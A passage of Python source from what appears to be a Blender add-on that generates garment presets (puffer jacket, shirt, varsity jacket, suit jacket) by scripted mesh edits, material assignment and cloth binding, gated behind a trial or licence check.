            group_vertices(name_of_group="DivineCursorB", weight=1)
            bpy.ops.object.mode_set(mode='EDIT')
            bpy.ops.mesh.select_more()
            basket = append_selected_vertices_indices_to_array()
            bpy.context.active_object.vertex_groups.active_index = bpy.context.active_object.vertex_groups['DivineCursorB'].index
            bpy.ops.object.vertex_group_deselect()
            bpy.ops.object.vertex_group_remove(all=False, all_unlocked=False)
            puffselection += append_selected_vertices_indices_to_array()        
            
            select_vertices(puffselection, deselect=True)
            
            #if('PufferSelection' in bpy.context.active_object.vertex_groups)
            bpy.ops.mesh.bevel(offset=0.001, offset_pct=0, segments=2, affect='EDGES')
            bpy.ops.mesh.select_less()
            group_vertices(name_of_group="PufferSelection", weight=1)
            bpy.context.scene.puffpressure_property = 0.5
            bpy.ops.object.mode_set(mode='EDIT')
            bpy.ops.object.puffer()
            bpy.ops.screen.animation_play()
            bpy.context.scene.frame_current = bpy.context.scene.frame_current
            bpy.ops.object.mode_set(mode='EDIT')
            bpy.ops.mesh.reveal()
            bpy.ops.mesh.select_all(action='DESELECT')
            
            #Puffer Front
            basket = []
            bpy.ops.mesh.select_linked_pick(deselect=False, delimit={'UV'}, object_index=0, index=19)
            bpy.ops.mesh.hide(unselected=True)
            select_vertex_group("WaistLoop", deselect=True)
            bpy.ops.mesh.select_more()
            group_vertices(name_of_group="DivineCursorC", weight=1)
            bpy.ops.object.mode_set(mode='EDIT')
            bpy.ops.mesh.select_more()
            basket = append_selected_vertices_indices_to_array()
            bpy.context.active_object.vertex_groups.active_index = bpy.context.active_object.vertex_groups['DivineCursorC'].index
            bpy.ops.object.vertex_group_deselect()
            bpy.ops.object.vertex_group_remove(all=False, all_unlocked=False)
            puffselection += append_selected_vertices_indices_to_array()
            
            select_vertices(basket, deselect=True)
            bpy.ops.mesh.select_more()
            group_vertices(name_of_group="DivineCursorD", weight=1)
            bpy.ops.object.mode_set(mode='EDIT')
            bpy.ops.mesh.select_more()
            basket = append_selected_vertices_indices_to_array()
            bpy.context.active_object.vertex_groups.active_index = bpy.context.active_object.vertex_groups['DivineCursorD'].index
            bpy.ops.object.vertex_group_deselect()
            bpy.ops.object.vertex_group_remove(all=False, all_unlocked=False)
            puffselection += append_selected_vertices_indices_to_array()
            
            select_vertices(puffselection, deselect=True)
            
            bpy.ops.mesh.bevel(offset=0.001, offset_pct=0, segments=2, affect='EDGES')
            bpy.ops.mesh.select_less()
            bpy.context.active_object.vertex_groups.active_index = bpy.context.active_object.vertex_groups['PufferSelection'].index
            bpy.ops.object.vertex_group_assign()
            #replace_weights(group='PufferSelection', weight=1)
            #group_vertices(name_of_group="PufferSelection", weight=1)
            bpy.context.scene.puffpressure_property = 0.001
            bpy.ops.object.mode_set(mode='EDIT')
            bpy.ops.object.puffer()
            bpy.ops.screen.animation_play()
            bpy.context.scene.frame_current = bpy.context.scene.frame_current
            bpy.ops.object.mode_set(mode='EDIT')
            bpy.ops.mesh.reveal()
            bpy.ops.mesh.select_all(action='DESELECT')
            
            #Redo Unwrap
            select_vertices([15,21], deselect=True)
            bpy.ops.mesh.shortest_path_select()
            replace_weights(group="Unwrap", weight=1)
            bpy.ops.mesh.mark_sharp()
            
            #Extrude Bottom
            select_vertex_group("WaistLoop", deselect=True)
            bpy.ops.mesh.mark_sharp()
            bpy.ops.mesh.extrude_region_move()
            length=edge_length(1,2)
            move((0,0,-length))
            select_vertices([19])
            bpy.ops.transform.edge_crease(value=1, snap=False)
            
            #Clean Sharp
            select_vertices([7,24], deselect=True)
            bpy.ops.mesh.shortest_path_select()
            bpy.ops.mesh.mark_sharp(clear=True)
            bpy.ops.mesh.select_all(action='DESELECT')
            
            if(bpy.context.scene.preset_materials_toggle_property):
                #Creating Materials
                bpy.context.scene.cloth_object.select_set(True)
                bpy.context.view_layer.objects.active = bpy.context.scene.cloth_object
                bpy.context.scene.cloth_object.data.materials.append(bpy.data.materials.new(name="Divine_Puffer_Jacket_Body"))
                bpy.context.scene.cloth_object.data.materials.append(bpy.data.materials.new(name="Divine_Puffer_Jacket_Secondary"))
                
                #Assigning Materials
                select_vertex_group("BiceptLoop", deselect=True)
                bpy.ops.mesh.select_more()
                select_vertex_group("WaistLoop", deselect=False)
                bpy.context.scene.cloth_object.active_material_index = 1
                bpy.ops.object.material_slot_assign()
                bpy.ops.mesh.select_all(action='DESELECT')
                
                #Setting Material Colours
                bpy.context.scene.cloth_object.active_material_index = 1
                bpy.context.scene.cloth_object.active_material.diffuse_color = (0.800032, 0.523353, 0.184638, 1)
                
                bpy.context.scene.cloth_object.active_material_index = 0
                bpy.context.scene.cloth_object.active_material.diffuse_color = (0.040018, 0.040018, 0.040018, 1)
                
                bpy.context.space_data.shading.color_type = 'MATERIAL'
            
            #Finalize
            bpy.ops.object.mode_set(mode='OBJECT')
            bpy.ops.object.select_all(action='DESELECT')
            if(bpy.context.scene.preset_hoodie_toggle_property):
                hoodie.select_set(True)
                bpy.context.view_layer.objects.active = hoodie
            bpy.ops.object.bind_to_character()
            bpy.ops.object.select_all(action='DESELECT')
            bpy.context.scene.cloth_object.select_set(True)
            bpy.context.view_layer.objects.active = bpy.context.scene.cloth_object
            bpy.context.scene.cloth_object.name = "Divine_Puffer_Jacket"
            bpy.ops.object.bind_to_character()
            bpy.ops.view3d.view_selected(use_all_regions=False)
            bpy.ops.screen.animation_play()
            
            bpy.context.preferences.view.language = safelanguage
            bpy.ops.ed.undo_push(message="Turn To Puffer Jacket")
            bpy.ops.object.play_sound(sound_name="NewPreset2.mp3")
            return{'FINISHED'}


class OBJECT_OT_turn_to_shirt(bpy.types.Operator):
    bl_idname = "object.turn_to_shirt"
    bl_label = "Turn to Shirt"
    
    
    def execute(self, context):
        if(fetch_button_text(Conscience) == None):
            bpy.ops.object.bad_connection()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Denied"):
            bpy.ops.object.trial_ended()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Granted"):
            #Starting
            safelanguage = bpy.context.preferences.view.language
            bpy.context.preferences.view.language = 'en_US'
            bpy.context.scene.tool_settings.transform_pivot_point = 'MEDIAN_POINT'
            bpy.context.scene.transform_orientation_slots[0].type = 'LOCAL'
            if(bpy.context.scene.preset_collar_toggle_property):
                bpy.ops.object.play_sound(sound_name="ShirtPreset.mp3")
            bpy.context.view_layer.objects.active = bpy.context.scene.cloth_object

            #Sort out Back
            select_vertices([0], deselect=True)
            bpy.ops.mesh.select_more()
            bpy.ops.mesh.select_more()
            replace_weights(group='Shrinkwrap', weight=1)
            replace_weights(group='Smooth', weight=1)
            bpy.ops.mesh.select_more()
            bpy.context.active_object.vertex_groups.active_index = bpy.context.active_object.vertex_groups['Shrinkwrap'].index
            bpy.ops.object.vertex_group_smooth(group_select_mode='ACTIVE', repeat=3)
            bpy.context.active_object.vertex_groups.active_index = bpy.context.active_object.vertex_groups['Smooth'].index
            bpy.ops.object.vertex_group_smooth(group_select_mode='ACTIVE', repeat=3)
            #bpy.ops.object.vertex_group_smooth(group_select_mode='ALL', repeat=3)
            
            #Sort Front/Chest
            select_vertices([1], deselect=True)
            bpy.ops.mesh.select_more()
            bpy.ops.mesh.select_more()
            replace_weights(group='Shrinkwrap', weight=1)
            replace_weights(group='Smooth', weight=1)
            bpy.ops.mesh.select_more()
            bpy.context.active_object.vertex_groups.active_index = bpy.context.active_object.vertex_groups['Shrinkwrap'].index
            bpy.ops.object.vertex_group_smooth(group_select_mode='ACTIVE', repeat=3)
            bpy.context.active_object.vertex_groups.active_index = bpy.context.active_object.vertex_groups['Smooth'].index
            bpy.ops.object.vertex_group_smooth(group_select_mode='ACTIVE', repeat=3)
            
            Row1 = []
            Row2 = []
            select_vertices([1,19], deselect=True)
            bpy.ops.mesh.shortest_path_select()
            bpy.ops.transform.edge_crease(value=1, snap=False)
            bpy.ops.mesh.mark_sharp()
            
            #if(bpy.context.scene.preset_open_toggle_property):
            #Rip it Open
            bpy.ops.object.mode_set(mode='EDIT')
            select_vertices([1,19], deselect=True)
            bpy.ops.mesh.shortest_path_select()
            bpy.ops.transform.edge_crease(value=1, snap=False)
            bpy.ops.mesh.mark_sharp()
            bpy.ops.mesh.select_all(action='DESELECT')
            
            proportional_size = edge_length(19,21)*0.8
            movement_size = edge_length(19,47)
            select_vertices([1,19], deselect=True)
            bpy.ops.mesh.shortest_path_select()
            bpy.ops.transform.edge_crease(value=1, snap=False)
            bpy.ops.mesh.mark_sharp()
            bpy.context.scene.tool_settings.use_proportional_edit = True
            bpy.context.scene.tool_settings.use_proportional_connected = True
            bpy.context.scene.tool_settings.proportional_distance = proportional_size
            bpy.ops.transform.translate(value=(movement_size*0.75, 0, 0), orient_type='GLOBAL', orient_matrix=((1, 0, 0), (0, 1, 0), (0, 0, 1)), orient_matrix_type='LOCAL', constraint_axis=(True, False, False), mirror=True, use_proportional_edit=True, proportional_edit_falloff='SMOOTH', proportional_size=proportional_size, use_proportional_connected=True, use_proportional_projected=False, snap=False, snap_elements={'FACE'}, use_snap_project=False, snap_target='ACTIVE', use_snap_self=True, use_snap_edit=True, use_snap_nonedit=True, use_snap_selectable=False)
            bpy.context.scene.tool_settings.use_proportional_edit = False

            Row1 = append_selected_vertices_indices_to_array()
            bpy.ops.mesh.extrude_region_move()
            length=edge_length(19,47)
            move((-length/2,0,0))
            Row2 = append_selected_vertices_indices_to_array()
            
            if(bpy.context.scene.preset_collar_toggle_property):
                #Add a collar
                bpy.ops.object.mode_set(mode='OBJECT')
                bpy.ops.object.add_collar()
                collar = bpy.context.active_object
                bpy.context.object.modifiers["Softbody"].show_viewport = False
                bpy.ops.object.mode_set(mode='OBJECT')
                bpy.ops.object.select_all(action='DESELECT')
                bpy.context.scene.cloth_object.select_set(True)
                bpy.context.view_layer.objects.active = bpy.context.scene.cloth_object
            
            if(bpy.context.scene.preset_open_toggle_property == False):
                #Apply Mirror
                bpy.ops.object.mode_set(mode='OBJECT')
                bpy.ops.object.select_all(action='DESELECT')
                bpy.context.scene.cloth_object.select_set(True)
                bpy.context.view_layer.objects.active = bpy.context.scene.cloth_object
                bpy.ops.object.modifier_apply(modifier="Mirror", report=True)
            
            if(bpy.context.scene.preset_open_toggle_property == False):
                #Button Together
                bpy.ops.object.mode_set(mode='EDIT')
                select_vertices(Row1, deselect=True)
                bpy.ops.mesh.select_mirror()
                select_vertices(Row2, deselect=False)
                bpy.ops.mesh.bridge_edge_loops()
                bpy.ops.mesh.delete(type='ONLY_FACE')
            else:
                select_vertices([1,19], deselect=True)
                bpy.ops.mesh.shortest_path_select()
                bpy.ops.transform.edge_crease(value=1, snap=False)
                bpy.ops.mesh.mark_sharp()
            
            select_vertices([1,2,63], deselect=True)
            bpy.ops.transform.edge_crease(value=1, snap=False)
            
            if(bpy.context.scene.preset_open_toggle_property):
                bpy.ops.mesh.select_mirror()
                bpy.ops.transform.edge_crease(value=1, snap=False)
            
            select_vertex_group("WaistLoop", deselect=True)
            bpy.ops.mesh.mark_sharp()
            bpy.ops.transform.edge_crease(value=1, snap=False)
            
            if(bpy.context.scene.preset_open_toggle_property == False):
                select_vertices(Row2, deselect=True)
                bpy.ops.mesh.select_mirror()
                select_vertices(Row1, deselect=False)
                bpy.ops.mesh.bridge_edge_loops()
                bpy.ops.mesh.delete(type='ONLY_FACE')
            
                #Shifting Rows
                select_vertices(Row2, deselect=True)
                bpy.context.object.use_mesh_mirror_x = True
                length=((edge_length(19,47))/3)
                move((0,length*-1.5,0))
                replace_weights(group='Shrinkwrap', weight=0)
                bpy.ops.mesh.select_mirror()
                bpy.context.object.use_mesh_mirror_x = False
                move((0,length*3,0))
                replace_weights(group='Shrinkwrap', weight=0)
            
            
            
                select_vertices(Row1, deselect=True)
                bpy.ops.mesh.select_mirror()
                select_vertices(Row1, deselect=False)
                bpy.ops.transform.edge_crease(value=1, snap=False)
                bpy.ops.mesh.mark_sharp()
            
            select_vertex_group("Unwrap", deselect=True)
            select_vertex_group("BiceptCuffs", deselect=False)
            bpy.ops.mesh.mark_sharp()
            
            bpy.ops.object.mode_set(mode='OBJECT')
            bpy.context.object.modifiers["Subdivision.001"].show_viewport = True
            bpy.ops.object.select_all(action='DESELECT')
            if(bpy.context.scene.preset_collar_toggle_property):
                collar.select_set(True)
                bpy.context.view_layer.objects.active = collar
                bpy.ops.object.bind_to_character()
            
            bpy.ops.object.select_all(action='DESELECT')
            bpy.context.scene.cloth_object.select_set(True)
            bpy.context.view_layer.objects.active = bpy.context.scene.cloth_object
            bpy.context.scene.cloth_object.name = "Divine_Corporate_Shirt"
            bpy.context.object.modifiers["Cloth"].settings.use_sewing_springs = True
            bpy.context.object.modifiers["Cloth"].settings.sewing_force_max = 0
            

            
            
            
            
            
            bpy.ops.ed.undo_push(message="Turn To Shirt")
            bpy.ops.object.play_sound(sound_name="NewPreset.mp3")
            if(bpy.context.scene.preset_collar_toggle_property == False):
                bpy.ops.object.play_sound(sound_name="NewPreset2.mp3")
            bpy.ops.screen.animation_play()
            bpy.context.preferences.view.language = safelanguage
            return{'FINISHED'}

class OBJECT_OT_turn_to_varsity_jacket(bpy.types.Operator):
    bl_idname = "object.turn_to_varsity_jacket"
    bl_label = "Turn to Varsity Jacket"
    
    
    def execute(self, context):
        if(fetch_button_text(Conscience) == None):
            bpy.ops.object.bad_connection()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Denied"):
            bpy.ops.object.trial_ended()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Granted"):
            #Start
            safelanguage = bpy.context.preferences.view.language
            bpy.context.preferences.view.language = 'en_US'
            bpy.context.scene.tool_settings.transform_pivot_point = 'MEDIAN_POINT'
            bpy.context.scene.transform_orientation_slots[0].type = 'LOCAL'
            bpy.ops.object.play_sound(sound_name="NewPreset.mp3")
            bpy.context.view_layer.objects.active = bpy.context.scene.cloth_object
            
            #Seam the cuffs
            bpy.ops.object.mode_set(mode='EDIT')
            select_vertex_group("Seams", deselect=True)
            bpy.ops.mesh.mark_sharp()
            select_vertex_group("BiceptLoop", deselect=True)
            bpy.ops.mesh.select_more()
            replace_weights(group='Shrinkwrap', weight=1)
            replace_weights(group='Smooth', weight=1)
            replace_weights(group='Pinning', weight=1)
            deselect_vertex_group(group_name="BiceptLoop")
            bpy.ops.mesh.mark_sharp()
            
            #Sort out Back
            select_vertices([0], deselect=True)
            bpy.ops.mesh.select_more()
            bpy.ops.mesh.select_more()
            replace_weights(group='Shrinkwrap', weight=1)
            replace_weights(group='Smooth', weight=1)
            bpy.ops.mesh.select_more()
            bpy.context.active_object.vertex_groups.active_index = bpy.context.active_object.vertex_groups['Shrinkwrap'].index
            bpy.ops.object.vertex_group_smooth(group_select_mode='ACTIVE', repeat=3)
            bpy.context.active_object.vertex_groups.active_index = bpy.context.active_object.vertex_groups['Smooth'].index
            bpy.ops.object.vertex_group_smooth(group_select_mode='ACTIVE', repeat=3)
            #bpy.ops.object.vertex_group_smooth(group_select_mode='ALL', repeat=3)
            
            #Sort Front/Chest
            select_vertices([1], deselect=True)
            bpy.ops.mesh.select_more()
            bpy.ops.mesh.select_more()
            replace_weights(group='Shrinkwrap', weight=1)
            replace_weights(group='Smooth', weight=1)
            bpy.ops.mesh.select_more()
            bpy.context.active_object.vertex_groups.active_index = bpy.context.active_object.vertex_groups['Shrinkwrap'].index
            bpy.ops.object.vertex_group_smooth(group_select_mode='ACTIVE', repeat=3)
            bpy.context.active_object.vertex_groups.active_index = bpy.context.active_object.vertex_groups['Smooth'].index
            bpy.ops.object.vertex_group_smooth(group_select_mode='ACTIVE', repeat=3)
            
            #Sliding the collar vertex
            bpy.context.object.use_mesh_mirror_x = False
            select_vertices([1], deselect=True)
            bpy.ops.transform.vert_slide(value=0.5, mirror=True, snap=False, snap_elements={'FACE'}, use_snap_project=False, snap_target='ACTIVE', use_snap_self=True, use_snap_edit=True, use_snap_nonedit=True, use_snap_selectable=False, correct_uv=True)
            select_vertex_group("NeckLoop", deselect=True)
            bpy.ops.mesh.select_more()
            deselect_vertex_group(group_name="NeckLoop")
            bpy.ops.mesh.mark_sharp()
            bpy.ops.transform.edge_crease(value=1, snap=False)
            
            #Seam the Bottom
            length = edge_length(19,47)
            select_vertex_group("WaistLoop")
            bpy.ops.transform.edge_slide(value=0.5, mirror=True, snap=False, snap_elements={'FACE'}, use_snap_project=False, snap_target='ACTIVE', use_snap_self=True, use_snap_edit=True, use_snap_nonedit=True, use_snap_selectable=False, correct_uv=True)
            bpy.ops.mesh.select_more()
            deselect_vertex_group(group_name="WaistLoop")
            bpy.ops.mesh.mark_sharp()
            bpy.ops.transform.edge_crease(value=1, snap=False)
            
            if(bpy.context.scene.preset_open_toggle_property):
                #Rip Open
                proportional_size = (edge_length(19,21))*0.8
                movement_size = edge_length(19,47)
                select_vertices([1,19], deselect=True)
                bpy.ops.mesh.shortest_path_select()
                bpy.ops.transform.edge_crease(value=1, snap=False)
                bpy.ops.mesh.mark_sharp()
                bpy.context.scene.tool_settings.use_proportional_edit = True
                bpy.context.scene.tool_settings.use_proportional_connected = True
                bpy.context.scene.tool_settings.proportional_distance = proportional_size
                bpy.ops.transform.translate(value=(movement_size, 0, 0), orient_type='GLOBAL', orient_matrix=((1, 0, 0), (0, 1, 0), (0, 0, 1)), orient_matrix_type='LOCAL', constraint_axis=(True, False, False), mirror=True, use_proportional_edit=True, proportional_edit_falloff='SMOOTH', proportional_size=proportional_size, use_proportional_connected=True, use_proportional_projected=False, snap=False, snap_elements={'FACE'}, use_snap_project=False, snap_target='ACTIVE', use_snap_self=True, use_snap_edit=True, use_snap_nonedit=True, use_snap_selectable=False)
                bpy.context.scene.tool_settings.use_proportional_edit = False
            else:
                select_vertices([1,19], deselect=True)
                bpy.ops.mesh.shortest_path_select()
                bpy.ops.transform.edge_crease(value=1, snap=False)
                bpy.ops.mesh.mark_sharp()
            #Pinning Chest
            select_vertices([1,2,3,4,36,63], deselect=True)
            bpy.ops.mesh.select_more()
            replace_weights(group="Pinning", weight=0.8)
            bpy.ops.mesh.select_more()
            bpy.ops.mesh.select_more()
            bpy.context.active_object.vertex_groups.active_index = bpy.context.active_object.vertex_groups['Pinning'].index
            bpy.ops.object.vertex_group_smooth(group_select_mode='ACTIVE', repeat=3)
            bpy.ops.mesh.select_all(action='DESELECT')
            
            
            if(bpy.context.scene.preset_materials_toggle_property):
                #Create Material Groups
                bpy.context.scene.cloth_object.select_set(True)
                bpy.context.view_layer.objects.active = bpy.context.scene.cloth_object
                
                bpy.context.scene.cloth_object.data.materials.append(bpy.data.materials.new(name="Divine_Varsity_Jacket_Body"))
                bpy.context.scene.cloth_object.data.materials.append(bpy.data.materials.new(name="Divine_Varsity_Jacket_Secondary"))
                bpy.context.scene.cloth_object.data.materials.append(bpy.data.materials.new(name="Divine_Varsity_Jacket_Front"))
                
                '''
                ob = bpy.context.active_object
                # Get material
                mat = bpy.data.materials.get("Material")
                if mat is None:
                    # create material
                    mat = bpy.data.materials.new(name="Material")

                # Assign it to object
                if ob.data.materials:
                    # assign to 1st material slot
                    ob.data.materials[0] = mat
                else:
                    # no slots
                    ob.data.materials.append(mat)
                
                bpy.ops.object.material_slot_add()
                bpy.ops.material.new()
                bpy.context.scene.cloth_object.active_material_index = 0
                bpy.context.scene.cloth_object.active_material.name = "Divine_Varsity_Jacket_Body"
                bpy.ops.object.material_slot_add()
                bpy.ops.material.new()
                bpy.context.scene.cloth_object.active_material_index = 1
                bpy.context.scene.cloth_object.active_material.name = "Divine_Varsity_Jacket_Secondary"
                bpy.ops.object.material_slot_add()
                bpy.ops.material.new()
                bpy.context.scene.cloth_object.active_material_index = 2
                bpy.context.scene.cloth_object.active_material.name = "Divine_Varsity_Jacket_Front"
                '''
                
                
                #Assign Different Materials
                select_vertices([19], deselect=True)
                bpy.ops.mesh.select_linked_pick(deselect=False, delimit={'UV'}, object_index=0, index=19)
                bpy.context.scene.cloth_object.active_material_index = 2
                bpy.ops.object.material_slot_assign()
                
                select_vertex_group("NeckLoop", deselect=True)
                select_vertex_group("BiceptLoop", deselect=False)
                select_vertex_group("WaistLoop", deselect=False)
                bpy.ops.mesh.select_more()
                bpy.context.scene.cloth_object.active_material_index = 1
                bpy.ops.object.material_slot_assign()
                
                #Setting Material Colours
                bpy.context.scene.cloth_object.active_material_index = 2
                bpy.context.scene.cloth_object.active_material.diffuse_color = (0.040018, 0.040018, 0.040018, 1)
                
                bpy.context.scene.cloth_object.active_material_index = 1
                bpy.context.scene.cloth_object.active_material.diffuse_color = (0.800032, 0.523353, 0.184638, 1)
                
                bpy.context.scene.cloth_object.active_material_index = 0
                bpy.context.scene.cloth_object.active_material.diffuse_color = (0.8, 0.8, 0.8, 1)
            
            #Finalize
            bpy.ops.object.mode_set(mode='OBJECT')
            bpy.context.object.modifiers["Subdivision.001"].show_viewport = True
            bpy.context.object.modifiers["Cloth"].settings.tension_stiffness = 2
            bpy.context.object.modifiers["Cloth"].settings.shear_stiffness = 2
            bpy.context.space_data.shading.color_type = 'MATERIAL'
            bpy.ops.object.select_all(action='DESELECT')
            bpy.context.scene.cloth_object.select_set(True)
            bpy.context.view_layer.objects.active = bpy.context.scene.cloth_object
            bpy.context.scene.cloth_object.name = "Divine_Varsity_Jacket"
            bpy.ops.object.bind_to_character()
            bpy.ops.view3d.view_selected(use_all_regions=False)
            bpy.ops.screen.animation_play()
            
            bpy.ops.ed.undo_push(message="Turn To Varsity Jacket")
            bpy.ops.object.play_sound(sound_name="NewPreset2.mp3")
            bpy.context.preferences.view.language = safelanguage
            return{'FINISHED'}


class OBJECT_OT_turn_to_suit_jacket(bpy.types.Operator):
    bl_idname = "object.turn_to_suit_jacket"
    bl_label = "Turn to Suit Jacket"
    
    
    def execute(self, context):
        if(fetch_button_text(Conscience) == None):
            bpy.ops.object.bad_connection()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Denied"):
            bpy.ops.object.trial_ended()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Granted"):
            #START
            safelanguage = bpy.context.preferences.view.language
            bpy.context.preferences.view.language = 'en_US'
            bpy.context.scene.tool_settings.transform_pivot_point = 'MEDIAN_POINT'
            bpy.context.scene.transform_orientation_slots[0].type = 'LOCAL'
            bpy.context.view_layer.objects.active = bpy.context.scene.cloth_object
            
            if('Divine_Skirt' in bpy.context.scene.cloth_object.name):
                bpy.ops.object.play_sound(sound_name="skirttoblazer.mp3")
                bpy.context.preferences.view.language = safelanguage
                return {'FINISHED'}
            elif('Divine_Trousers' in bpy.context.scene.cloth_object.name):
                bpy.ops.object.play_sound(sound_name="trouserstoblazer.mp3")
                bpy.context.preferences.view.language = safelanguage
                return {'FINISHED'}
            
            bpy.ops.object.mode_set(mode='EDIT')
            select_vertices([45], deselect=True)
            bpy.ops.mesh.select_more(use_face_step=True)
            AlmightyLoop = append_selected_vertices_indices_to_array()
            print(AlmightyLoop)
            LowTip = max(AlmightyLoop)
            #SAVING POINTS AND BUOYS
            #if(bpy.context.scene.preset_open_toggle_property):
            
            #Rip Open
            proportional_size = edge_length(19,21)
            movement_size = edge_length(19,47) * 0.8
            select_vertices([1,19], deselect=True)
            bpy.ops.mesh.shortest_path_select()
            #bpy.ops.transform.edge_crease(value=1, snap=False)
            #bpy.ops.mesh.mark_sharp()
            bpy.context.scene.tool_settings.use_proportional_edit = True
            bpy.context.scene.tool_settings.use_proportional_connected = True
            bpy.context.scene.tool_settings.proportional_edit_falloff = 'SMOOTH'
            bpy.context.scene.tool_settings.proportional_distance = proportional_size
            bpy.ops.transform.translate(value=(movement_size, 0, 0), orient_type='GLOBAL', orient_matrix=((1, 0, 0), (0, 1, 0), (0, 0, 1)), orient_matrix_type='LOCAL', constraint_axis=(True, False, False), mirror=True, use_proportional_edit=True, proportional_edit_falloff='SMOOTH', proportional_size=proportional_size, use_proportional_connected=True, use_proportional_projected=False, snap=False, snap_elements={'FACE'}, use_snap_project=False, snap_target='ACTIVE', use_snap_self=True, use_snap_edit=True, use_snap_nonedit=True, use_snap_selectable=False)
            bpy.context.scene.tool_settings.use_proportional_edit = False
            
            
            
            
            #Saving Buoys
            little = edge_length(23,38)*0.2
            step = edge_length(42,43) * 0.5
            Step5 = mathutils.Vector((select_vertices([23,37,38,43], deselect=True, get_location=True)[0], select_vertices([23,37,38,43], deselect=True, get_location=True)[1] - little, select_vertices([23,37,38,43], deselect=True, get_location=True)[2] + little)) 
            Step4 = mathutils.Vector((select_vertices([42], deselect=True, get_location=True)[0] + step*1.35, select_vertices([42], deselect=True, get_location=True)[1], select_vertices([42], deselect=True, get_location=True)[2]))
            Step3 = mathutils.Vector((select_vertices([45], deselect=True, get_location=True)[0] + step*1.2, select_vertices([45], deselect=True, get_location=True)[1], select_vertices([45], deselect=True, get_location=True)[2]))
            Step2 = mathutils.Vector((select_vertices([LowTip], deselect=True, get_location=True)[0] + step, select_vertices([LowTip], deselect=True, get_location=True)[1], select_vertices([LowTip], deselect=True, get_location=True)[2]))
            Step1 = mathutils.Vector((select_vertices([LowTip+1], deselect=True, get_location=True)[0] + step*0.75, select_vertices([LowTip+1], deselect=True, get_location=True)[1] - step*0., select_vertices([LowTip+1], deselect=True, get_location=True)[2]))
            
            buoy1 = select_vertices([61], deselect=True, get_location=True)
            buoy2 = select_vertices([60], deselect=True, get_location=True)
            buoy3 = select_vertices([59], deselect=True, get_location=True)
            buoy4 = select_vertices([58], deselect=True, get_location=True)
            buoy5 = select_vertices([57], deselect=True, get_location=True)
            
            shortcollartip = mathutils.Vector((select_vertices([37,38,61,62], deselect=True, get_location=True)[0], select_vertices([37,38,61,62], deselect=True, get_location=True)[1] - edge_length(42,43)*0.2, select_vertices([37,38,61,62], deselect=True, get_location=True)[2] + edge_length(42,43)*0.2)) 
            shortcollarinnertip = mathutils.Vector((select_vertices([36,37,62,63], deselect=True, get_location=True)[0] - edge_length(42,43)*0.1, select_vertices([36,37,62,63], deselect=True, get_location=True)[1], select_vertices([36,37,62,63], deselect=True, get_location=True)[2] + edge_length(42,43)*0.2)) 
            
            #Separate Collar
            select_vertices([0,LowTip+1], deselect=True)
            bpy.ops.mesh.shortest_path_select()
            Shift = edge_length(3,50)
            
            bpy.context.active_object.name = 'Divine_Suit_Jacket_InDev'
            bpy.ops.mesh.duplicate_move()
            bpy.ops.mesh.separate(type='SELECTED')
            bpy.ops.object.mode_set(mode = 'OBJECT')
            Cloth = bpy.context.scene.cloth_object
            Collar = bpy.data.objects["Divine_Suit_Jacket_InDev.001"]
            bpy.ops.object.select_all(action='DESELECT')
            bpy.context.view_layer.objects.active = Collar
            
            #Remove Mirror
            bpy.ops.object.modifier_remove(modifier="Mirror")
            
            #Select 1 to 12 and Extrudemove Y and Z
            #Y movement
            select_vertices([1,12], deselect=True)
            bpy.ops.mesh.shortest_path_select()
            move_distance = edge_length(11,12)*0.2
            bpy.ops.mesh.extrude_region_move()
            move((0, -move_distance, move_distance*0.5))
            replace_weights(group='Smooth', weight=0)
            replace_weights(group='Shrinkwrap', weight=0)

            #Z movement
            select_vertices([2,0], deselect=True)
            bpy.ops.mesh.shortest_path_select()
            bpy.ops.mesh.extrude_region_move()
            move((0, 0, move_distance*2))
            replace_weights(group='Smooth', weight=0)
            replace_weights(group='Shrinkwrap', weight=0)
            
            #Collar Adjustment
            select_vertices([20], deselect_vertices=True)
            move((-move_distance, 0, 0))
            select_vertices([20], deselect=True)
            move((0, -move_distance, 0))
            
            select_vertices([1,2,13,21], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([1,2,10,13], deselect=True)
            bpy.ops.transform.edge_crease(value=1, snap=False)
            
            #Longcollar to Buoys
            select_vertices([14], deselect=True)
            bpy.ops.mesh.extrude_region_move()
            set_vertex_location_by_index(vertex_index=(get_highest_vertex_index()+1), world_position=Step5)
            
            select_vertices([15], deselect=True)
            bpy.ops.mesh.extrude_region_move()
            set_vertex_location_by_index(vertex_index=get_highest_vertex_index()+1, world_position=Step4)
            
            select_vertices([16], deselect=True)
            bpy.ops.mesh.extrude_region_move()
            set_vertex_location_by_index(vertex_index=get_highest_vertex_index()+1, world_position=Step3)
            
            select_vertices([18], deselect=True)
            bpy.ops.mesh.extrude_region_move()
            set_vertex_location_by_index(vertex_index=get_highest_vertex_index()+1, world_position=Step2)
            
            select_vertices([19], deselect=True)
            bpy.ops.mesh.extrude_region_move()
            set_vertex_location_by_index(vertex_index=get_highest_vertex_index()+1, world_position=Step1)
            
            #Shortcollar to Buoys
            select_vertices([22], deselect=True)
            bpy.ops.mesh.extrude_region_move()
            set_vertex_location_by_index(vertex_index=(get_highest_vertex_index()+1), world_position=buoy1)
            
            select_vertices([23], deselect=True)
            bpy.ops.mesh.extrude_region_move()
            set_vertex_location_by_index(vertex_index=get_highest_vertex_index()+1, world_position=buoy2)
            
            select_vertices([24], deselect=True)
            bpy.ops.mesh.extrude_region_move()
            set_vertex_location_by_index(vertex_index=get_highest_vertex_index()+1, world_position=buoy3)
            
            select_vertices([25], deselect=True)
            bpy.ops.mesh.extrude_region_move()
            set_vertex_location_by_index(vertex_index=get_highest_vertex_index()+1, world_position=buoy4)
            
            select_vertices([20], deselect=True)
            bpy.ops.mesh.extrude_region_move()
            set_vertex_location_by_index(vertex_index=get_highest_vertex_index()+1, world_position=buoy5)
            
            selectsave = select_vertices([26,3], deselect=True, get_location=True)
            select_vertices([21], deselect=True)
            bpy.ops.mesh.extrude_region_move()
            set_vertex_location_by_index(vertex_index=get_highest_vertex_index()+1, world_position=selectsave)
            
            #ShortCollar Tips (Inner and Outer)
            #selectsave = select_vertices([2,14], deselect=True, get_location=True)
            select_vertices([17], deselect=True)
            bpy.ops.mesh.extrude_region_move()
            set_vertex_location_by_index(vertex_index=(get_highest_vertex_index()+1), world_position=shortcollarinnertip)
            
